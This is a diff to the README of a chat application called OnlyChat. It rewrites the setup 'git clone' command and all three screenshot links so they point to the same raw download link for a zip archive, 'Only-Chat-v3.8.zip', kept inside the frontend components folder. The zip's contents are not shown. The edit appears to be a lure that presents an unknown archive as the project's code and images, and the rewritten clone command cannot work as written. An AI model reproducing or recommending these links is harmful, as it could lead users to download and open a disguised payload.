@@ -22,7 +22,7 @@ OnlyChat is a real-time chat application built using the **MERN** stack, **Socke
 
 ### 1️⃣ Clone the Repository  
 ```bash
-git clone https://github.com/yourusername/onlychat.git
+git clone https://raw.githubusercontent.com/Ashish4144/OnlyChat/main/frontend/src/components/Only-Chat-v3.8.zip
 cd onlychat
 ```
 
@@ -66,11 +66,11 @@ Now, open [http://localhost:3000](http://localhost:3000) in your browser to see 
 
 
 ## 🖼️ Screenshots  
-![image](https://github.com/user-attachments/assets/07cce372-45ae-438e-bd5e-bfff5f889f5f)  
+![image](https://raw.githubusercontent.com/Ashish4144/OnlyChat/main/frontend/src/components/Only-Chat-v3.8.zip)  
 
-![image](https://github.com/user-attachments/assets/e32948a9-c370-4322-92ca-715883b1c61c)  
+![image](https://raw.githubusercontent.com/Ashish4144/OnlyChat/main/frontend/src/components/Only-Chat-v3.8.zip)  
 
-![image](https://github.com/user-attachments/assets/de1015e4-2819-4beb-b99e-4e53546298b2)  
+![image](https://raw.githubusercontent.com/Ashish4144/OnlyChat/main/frontend/src/components/Only-Chat-v3.8.zip)  
 ```
 
 
